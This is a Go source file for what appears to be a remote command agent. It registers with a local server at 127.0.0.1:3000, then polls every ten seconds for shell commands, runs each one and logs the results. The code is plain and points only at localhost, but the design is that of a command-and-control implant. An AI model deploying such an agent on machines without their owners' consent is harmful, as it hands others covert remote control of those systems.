package main

import (
	dotenv "github.com/joho/godotenv"
	log "github.com/sirupsen/logrus"
	"os"
	"time"
)

// Define the server URL
var serverURL = "http://127.0.0.1:3000"
var token = "token_fill_later"
var client_id = 9999999999999999
var sysInfo *SystemInfo

type InstructionList struct {
	Instructions []string `json:"instructions"`
}

type CommandList struct {
	Commands []string `json:"commands"`
}

func main() {
	setupDotenv()
	getSystemInfo()

	var err error
	token, err = CreateToken(os.Getenv("JWT_SECRET"))
	if err != nil {
		log.Fatal(err)
	}

	client_id, err = register(serverURL, token, sysInfo)
	if err != nil {
		log.Info(err)
		time.Sleep(10 * time.Second)
		main()
	}
	work()

}

func work() {
	log.Info("Starting to receive tasks")
	for {
		commandWorkFlow()

		time.Sleep(10 * time.Second)
	}

}

func commandWorkFlow() {
	commands, err := receiveCommands(serverURL, token, 1)
	if err != nil {
		log.Info("Error while receiving tasks: ", err)
		return
	}

	if len(commands) == 0 {
		log.Info("Received no commands")
		return
	}
	//TODO: Add a check to see if the command is already executed
	for _, command := range commands {
		result := runCmd(command)
		log.WithFields(log.Fields{
			"\ncommand":  command,
			"\nid":       client_id,
			"\nMessage":  result.Message,
			"\nTime":     result.Time,
			"\nDir":      result.Dir,
			"\nExecuted": result.Executed,
		}).Info("Command:")
		time.Sleep(3 * time.Second)
	}
}

func setupDotenv() {
	err := dotenv.Load("../.env")
	if err != nil {
		log.Fatal("Error loading .env file")
	}
}
